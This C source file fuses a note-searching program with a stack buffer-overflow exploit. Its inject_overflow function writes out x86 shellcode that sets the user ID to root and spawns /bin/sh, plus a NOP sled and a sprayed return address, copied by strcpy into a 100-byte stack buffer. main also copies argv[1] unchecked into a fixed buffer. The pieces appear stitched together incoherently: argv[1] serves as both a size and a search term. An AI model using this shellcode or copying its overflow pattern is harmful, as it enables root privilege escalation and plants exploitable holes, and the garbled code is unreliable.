#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include "hacking.h"

#define FILENAME "/var/notes"

char shellcode[]=
  "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
  "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
  "\xe1\xcd\x80";


int print_notes(int, int, char *);
int find_user_note(int, int);
int search_note(char *, char *);
void fatal(char *);

void inject_overflow(int argc, char *argv[]) {
  char searchstring[100];

  unsigned int i, ret, size, offset=0;
  char *buffer;

  size = atoi(argv[1]);
  buffer = (char *) malloc(size);
  bzero(buffer, size); 

  if (argc > 2)
    offset = atoi(argv[2]);

  ret = (unsigned int) &i - offset;
 
  // llena el buffer con esa direccion de retorno
  for (i=0; i < size; i+=4)
    *((unsigned int *)(buffer+i)) = ret;

  // llena con "NOPs" la primer parte del buffer
  memset(buffer, 0x90, 60);
  // pone el shellcode luego de los NOPs
  memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

  strcpy(searchstring, buffer);
}

int main(int argc, char *argv[])
{
  int userid, printing=1, fd;
  char searchstring[100];

  inject_overflow(argc, argv);

  if (argc > 1)
    strcpy(searchstring, argv[1]);
  else
    searchstring[0] = 0;

  userid = getuid();

  fd = open(FILENAME, O_RDONLY);
  if (fd == -1)
    fatal("in main() while opening file for reading");

  while(printing)
    printing = print_notes(fd, userid, searchstring);
  printf("-----[ end of note data ]-----\n");
  close(fd);
  
  return 0;
}

int print_notes(int fd, int uid, char *searchstring) {
  int note_length;
  char byte=0, note_buffer[100];

  note_length = find_user_note(fd, uid);
  if(note_length == -1)
    return 0;

  read(fd, note_buffer, note_length);
  note_buffer[note_length] = 0;

  if(search_note(note_buffer, searchstring))
    printf("%s", note_buffer);

  return 1;
}

int find_user_note(int fd, int user_uid) {
  int note_uid = -1;
  unsigned char byte;
  int length;

  while (note_uid != user_uid) { 
    if (read(fd, &note_uid, 4) != 4) // read the uid data
      return -1;
    if (read(fd, &byte, 1) != 1) // read the newline separator
      return -1;

    byte = length = 0;
    while (byte != '\n') {
      if (read(fd, &byte, 1) != 1)
	return -1;
      length++;
    }
  }

  lseek(fd, length * -1, SEEK_CUR);

  printf("[DEBUG] found a %d byte note for user id %d\n", length, note_uid);
  return length;
}

int search_note(char *note, char *keyword) {
  int i, keyword_length, match=0;

  keyword_length = strlen(keyword);
  if (keyword_length == 0)
    return 1;

  for (i = 0; i < strlen(note); i++) {
    if (note[i] == keyword[match])
      match++;
    else 
      match = (note[i] == keyword[0]) ? 1 : 0;

    if (match == keyword_length)
      return 1;    
  }
  return 0;  
}
